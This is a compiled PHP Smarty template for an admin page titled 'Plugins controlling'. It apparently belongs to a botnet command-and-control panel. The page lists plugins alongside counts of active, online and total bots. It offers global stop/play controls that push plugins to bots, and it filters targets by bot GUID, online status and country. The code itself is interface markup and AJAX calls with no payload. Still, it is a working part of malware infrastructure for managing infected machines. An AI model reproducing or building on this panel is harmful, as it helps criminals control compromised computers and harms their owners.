<?php /* Smarty version Smarty-3.0.6, created on 2011-02-19 21:05:59
         compiled from "/var/www/maincp/client/templates/plugins.tpl" */ ?>
<?php /*%%SmartyHeaderCode:15507722704d6030b7a60076-52265934%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    'a15d984af5f93a0d9fc936880f88d3ccdd1fbe24' => 
    array (
      0 => '/var/www/maincp/client/templates/plugins.tpl',
      1 => 1297864334,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '15507722704d6030b7a60076-52265934',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<h2><b>Plugins controlling</b></h2>


<form id="frm__plugins">

<table width="300px" cellspacing="0" cellpadding="3" border="1" style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);">

<th style='background: rgb(80,80,80); color: rgb(232,232,232);'>Plugin for use</th>
<th style='background: rgb(80,80,80); color: rgb(232,232,232);'>Count</th>
<th style='background: rgb(80,80,80); color: rgb(232,232,232);'>[Global actions]</th>

<?php  $_smarty_tpl->tpl_vars['REC'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('CONT_ARR')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['REC']->key => $_smarty_tpl->tpl_vars['REC']->value){
?>
<tr align='center'>
<td align='left'> <table cellspacing='0' cellpadding='0'><tr><td><input type="radio" <?php echo $_smarty_tpl->tpl_vars['REC']->value['PCHECKED'];?>
 name="plugin" value="<?php echo $_smarty_tpl->tpl_vars['REC']->value['PLUGIN'];?>
"></td><td> <?php echo $_smarty_tpl->tpl_vars['REC']->value['PLUGIN'];?>
</td></tr></table> </td>
<td id='t<?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
' title='Active bots / Online bots / All bots ... with such plugin'><font style='color: rgb(65, 183, 81); font-size: 11px;'><b><?php echo $_smarty_tpl->tpl_vars['REC']->value['CNTACTONLINE'];?>
</b></font> <i>/</i> <b><?php echo $_smarty_tpl->tpl_vars['REC']->value['CNTONLINE'];?>
</b> <i>/</i> <?php echo $_smarty_tpl->tpl_vars['REC']->value['CNT'];?>
</td>			
<td><a id='bGlobalStop' href="#" onclick="showGlobalItemStat(0, <?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
, '<?php echo $_smarty_tpl->tpl_vars['REC']->value['PLUGIN'];?>
'); return false;"><img border='0' src='img/icos/stop.png'></a>
<a id='bGlobalPlay' href="#" onclick="showGlobalItemStat(1, <?php echo $_smarty_tpl->tpl_vars['REC']->value['I'];?>
, '<?php echo $_smarty_tpl->tpl_vars['REC']->value['PLUGIN'];?>
'); return false;"><img border='0' src='img/icos/play.png'></a></td>	
</tr>
<?php }} ?>


</table>

<hr size="1" color="#cccccc">

<table width="100%" cellspacing="0" cellpadding="3" border="1" style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 255);">
<tr>
	<td width="150px" align="left"><b>Bot GUID :</b></td>
	<td align="left">
		<div>
		<span style="margin-left: 0px;"><input type="text" value="" name="bot_guid" id="bot_guid" style="width: 400px;"></span>
		</div>
	</td>
</tr>
<tr>
	<td width="150px" align="left"><b>Limit :</b></td>
	<td align="left"><input type="text" value="100" name="limit" id="limit" style="width: 50px;"></td>
</tr>
<tr>
	<td width="150px" align="left"><b>Options :</b></td>
	<td align="left">
		<table cellspacing="0" cellpadding="0"><tr>
			<td><input type="checkbox" checked name="onlyonline" id="onlyonline" style="width: 50px;"></td>
			<td> Only online</td>
		</table>
	</td>
</tr>


<script>function showCountries()
{
	var myDiv = document.getElementById('countries');
	var myExtDiv = document.getElementById('ext_countries');
	if(myDiv.style.display == 'none')
	{
		myDiv.style.display = 'block';
		myExtDiv.style.display = 'none';
	} else 
	{
		myDiv.style.display = 'none';
		myExtDiv.style.display = 'block';
	}
	return false;
}</script>


<tr align='left'>
	<td colspan="2">
		<FIELDSET><LEGEND align="center"><a href='javascript:void();' onclick='showCountries();'><b>Countries</b></a>:</LEGEND>
		<div id='ext_countries'><center><a href='javascript:void();' onclick='showCountries();'><i>click here to view countries list</i></a></center></div>
		<div id='countries' style='display:none;'>
		&nbsp;<a href="javascript:void(0)" onClick="CheckAll('fk_country', true);">Select All</a> &nbsp;&nbsp;
		<a href="javascript:void(0)" onClick="CheckAll('fk_country', false);">Unselect All</a>
		<table align='center'>
		<tr valign="top">

<?php  $_smarty_tpl->tpl_vars['ELEM'] = new Smarty_Variable;
 $_from = $_smarty_tpl->getVariable('CONT_ARR2')->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['ELEM']->key => $_smarty_tpl->tpl_vars['ELEM']->value){
?>
			<td>
				<table border='1' cellspacing='0' cellpadding='1' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>

	<?php  $_smarty_tpl->tpl_vars['REC'] = new Smarty_Variable;
 $_from = $_smarty_tpl->tpl_vars['ELEM']->value; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array');}
if ($_smarty_tpl->_count($_from) > 0){
    foreach ($_from as $_smarty_tpl->tpl_vars['REC']->key => $_smarty_tpl->tpl_vars['REC']->value){
?>
				<tr>
					<td width='20px' align="center"><input type="checkbox" id="idCntr<?php echo $_smarty_tpl->tpl_vars['REC']->value['MRES_IC'];?>
" name="fk_country[<?php echo $_smarty_tpl->tpl_vars['REC']->value['MRES_IC'];?>
]"></td>
					<td width='30px' align="center"><label for="idCntr<?php echo $_smarty_tpl->tpl_vars['REC']->value['MRES_IC'];?>
"><img border='0' src='img/flags/<?php echo $_smarty_tpl->tpl_vars['REC']->value['CCODE'];?>
.gif'></label></td>
					<td width='100px'>&nbsp; <label for="idCntr<?php echo $_smarty_tpl->tpl_vars['REC']->value['MRES_IC'];?>
"><?php echo $_smarty_tpl->tpl_vars['REC']->value['MRES_NAME'];?>
</label></td>
				</tr>


	<?php }} ?>
				</table></td>
<?php }} ?>

</tr>
		</table>
		</div>
		</FIELDSET></td>
</tr>


<tr>
	<td width="150px" align="center" colspan="2"><input type="button" onclick="get_plugins(); return false;" value="submit" id='bPluginsSubmit'></td>
</tr>
</table>

</form>

<hr size="1" color="#cccccc">

<div align="center" id="sub_div_ajax">
</div>



<script language="JavaScript" type="text/javascript">

function get_plugins() 
{
	var pdata = $('#frm__plugins').serialize(true);
    $.post('./mod/plugins_sub.php', pdata, function(data) { $("#sub_div_ajax").html(data); });
}

function showGlobalItemStat(arg, i, plugin) 
{
	load('./mod/plugins_glob.php?plugin=' + plugin + '&act=' + arg, 't' + i);
}

function CheckAll(name, checked) 
{
	f = document.getElementById('frm__plugins');
	for (var i = 0; i < f.elements.length; i++) {
		if(f.elements[i].type == 'checkbox' && f.elements[i].name.substr(0, name.length) == name){
			f.elements[i].checked = checked;
		}
	}
}

</script>
